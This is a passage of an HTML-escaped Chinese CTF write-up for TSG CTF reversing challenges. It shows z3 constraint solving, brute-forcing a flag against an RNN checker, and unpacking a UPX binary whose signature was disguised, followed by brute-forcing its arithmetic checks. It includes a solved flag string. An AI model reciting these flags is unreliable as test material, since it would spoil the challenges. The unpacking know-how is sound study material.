    v92 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;]
    v93 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v90 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v92
    v95 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;]
    v97 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v93 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v95 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v98 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;119&lt;/span&gt;]
    v100 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v97 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v98 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v101 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;]
    v103 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v100 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v101 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v104 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;]
    v105 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v103 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v104 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;126&lt;/span&gt;]
    v107 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;]
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(enc[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ((v105 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v107 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
        print (chr(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()[a1]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unsat&amp;#34;&lt;/span&gt;)
print ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跑得倒是挺快，就是一行一行复制有点累&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;natural-flag-processing&#34;&gt;natural flag processing&lt;/h3&gt;
&lt;p&gt;队友查看了out的参数，发现只有第314位为1，于是猜测只要满足第314位输出大于0，就通过验证了（在 &lt;code&gt;forward()&lt;/code&gt; 函数里加一行就验证了）&lt;/p&gt;
&lt;p&gt;先只输入 &lt;code&gt;TSGCTF{&lt;/code&gt; 测试了一下，然后惊奇地发现，每次运行完 &lt;code&gt;forward()&lt;/code&gt; 后，都会有一位大于0，于是猜测错误的输入会使得大于0的位消失，且消失后无法再得到大于0，这样就可以爆破了，大于0的数字消失就剪掉&lt;/p&gt;
&lt;p&gt;队友用dfs，我就用了bfs，主要就是在之前的代码上进行一些魔改（感觉这个更像misc啊）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; torch
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; torch &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; nn

FLAG_CHARS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&amp;#34;&lt;/span&gt;
CHARS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^$&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; FLAG_CHARS
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sanity_check&lt;/span&gt;(text):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; FLAG_CHARS
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; text[:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TSGCTF{&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; text[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; all([t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; FLAG_CHARS &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; text])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;embedding&lt;/span&gt;(text):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; CHARS
    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; torch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;zeros((len(text), len(CHARS)))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(text):
        x[i, CHARS&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(t)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Model&lt;/span&gt;(nn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Module):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, inpt, hidden):
        super()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RNNCell(inpt, hidden)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Linear(hidden, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;forward&lt;/span&gt;(self, xs):
        count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; baopo
        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; cur
        &lt;span style=&#34;color:#75715e&#34;&gt;# print (xs)&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# print (&amp;#39;-------------------------------&amp;#39;)&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; xs[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
            count &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
            h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell(x, h)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (len((h &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nonzero()) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
            print (cur)
            baopo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(cur)
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xs[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell(x, h)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;out(h)

count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inference&lt;/span&gt;(model, text):
    model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; torch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;no_grad():
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; embedding(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;text&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unsqueeze(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; model(x)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sigmoid()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cpu()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;item()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y


&lt;span style=&#34;color:#75715e&#34;&gt;# baopo = [&amp;#39;mRNA-st4nDs-f0r-mANuaLLy-tun3d-RecurrEn7-N3uRAl-AutoM4toN}&amp;#39;]&lt;/span&gt;
baopo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; baopo&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; FLAG_CHARS:
        model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Model(len(CHARS), &lt;span style=&#34;color:#ae81ff&#34;&gt;520&lt;/span&gt;)
        model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load_state_dict(torch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;model_final.pth&amp;#34;&lt;/span&gt;))
    &lt;span style=&#34;color:#75715e&#34;&gt;# text = input(&amp;#34;input flag:&amp;#34;)&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# sanity_check(text)&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# for i in range(400):&lt;/span&gt;
        text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;TSGCTF{&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j
        &lt;span style=&#34;color:#75715e&#34;&gt;# print (i, j)&lt;/span&gt;
        cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j
        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inference(model, text)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;:
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congrats!&amp;#34;&lt;/span&gt;)
            exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# print (cur)&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# else:&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;# print (res)&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;Wrong.&amp;#34;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;爆破的时间有点久&lt;/p&gt;
&lt;h3 id=&#34;optimized&#34;&gt;*optimized&lt;/h3&gt;
&lt;p&gt;这道题的UPX特征被完全去除了，以至于比赛的时候只看出来了是个壳，但没发现是UPX壳（其实猜到了，但elf就有点懒了&amp;hellip;）&lt;/p&gt;
&lt;p&gt;只需要打开010，将所有的 &lt;code&gt;tsg_&lt;/code&gt; 修改为 &lt;code&gt;UPX!&lt;/code&gt; 就行&lt;/p&gt;
&lt;p&gt;脱壳后发现就是简单的数学约束，例如&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;_mm_movemask_epi8(
  _mm_cmpeq_epi8(
    _mm_slli_si128((&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9569uLL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;),
    _mm_slli_si128(
      (&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)(((&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2AF91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; __int128)(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F50DDCA7B17LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v8)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;),
        &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;))) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;去官网查了一下函数的定义，就是要求&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)(((&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2AF91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; __int128)(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F50DDCA7B17LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v8)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__m128i&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9569uLL&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本来想用c或者汇编的，但128位一直会有一些问题，于是只好用python了&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9569&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F50DDCA7B17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2AF91&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x26CF2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4DC4591DAC8F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34AB9&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v8 = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, hex(i))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20468&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4AE11552DF1A&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36B39&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3787A&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span 